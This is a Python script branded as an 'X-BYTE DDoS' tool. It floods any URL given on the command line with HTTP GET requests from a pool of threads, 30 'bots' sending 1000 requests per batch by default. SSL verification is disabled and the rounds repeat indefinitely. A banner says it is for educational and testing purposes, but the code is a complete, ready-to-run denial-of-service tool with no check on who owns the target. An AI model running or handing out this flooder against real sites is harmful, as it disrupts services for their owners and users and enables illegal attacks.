import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
import pyfiglet
import argparse

# Initialize colorama
init(autoreset=True)

def print_banner():
    """Print the banner in red and version in yellow."""
    banner_text = pyfiglet.figlet_format("X-BYTE", font="slant")
    version_text = "DDoS Version 1.0"
    note_text = "This is only for educational and testing purposes. Made by X-BYTE."

    print(f"{Fore.RED}{banner_text}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{version_text}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{note_text}{Style.RESET_ALL}")

def send_requests(url, num_requests):
    """Send a specified number of requests to a URL and return the count of successful requests."""
    success_count = 0
    for _ in range(num_requests):
        try:
            response = requests.get(url, verify=False)  # Disable SSL verification for simplicity
            if response.status_code == 200:
                success_count += 1
            else:
                print(f"{Fore.RED}Site responded with status code {response.status_code}{Style.RESET_ALL}")
                sys.exit()
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}Request failed: {e}{Style.RESET_ALL}")
    return success_count

def bot_task(url, num_requests, duration):
    """Task for each bot to send requests and measure time, also track request rate."""
    start_time = time.time()
    end_time = start_time + duration
    total_successes = 0
    request_count = 0

    while time.time() < end_time:
        batch_start_time = time.time()
        successes = send_requests(url, num_requests)
        request_count += num_requests
        total_successes += successes
        batch_end_time = time.time()
        elapsed_time = batch_end_time - batch_start_time
        requests_per_second = num_requests / elapsed_time
        print(f"{Fore.GREEN}Requests sent in this batch: {num_requests}. Requests per second: {requests_per_second:.2f}{Style.RESET_ALL}")

    return total_successes

def load_test(url, num_bots, requests_per_bot, duration):
    """Perform the load test with the specified number of bots."""
    while True:
        print(f"Starting load test with {num_bots} bots on {url}.")

        total_requests_sent = 0

        with ThreadPoolExecutor(max_workers=num_bots) as executor:
            futures = [executor.submit(bot_task, url, requests_per_bot, duration) for _ in range(num_bots)]
            for future in as_completed(futures):
                total_requests_sent += future.result()

        print(f"Total requests sent: [{total_requests_sent}]")
        
        # Wait before next round
        time.sleep(duration)

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="DDoS Load Testing Tool")
    parser.add_argument('url', type=str, help="The URL to target (e.g., http://example.com or https://example.com)")
    parser.add_argument('--bots', type=int, default=30, help="Number of bots (default: 30)")
    parser.add_argument('--requests', type=int, default=1000, help="Requests per bot (default: 1000)")
    parser.add_argument('--duration', type=int, default=60, help="Duration of each test round in seconds (default: 60)")

    args = parser.parse_args()

    load_test(args.url, args.bots, args.requests, args.duration)
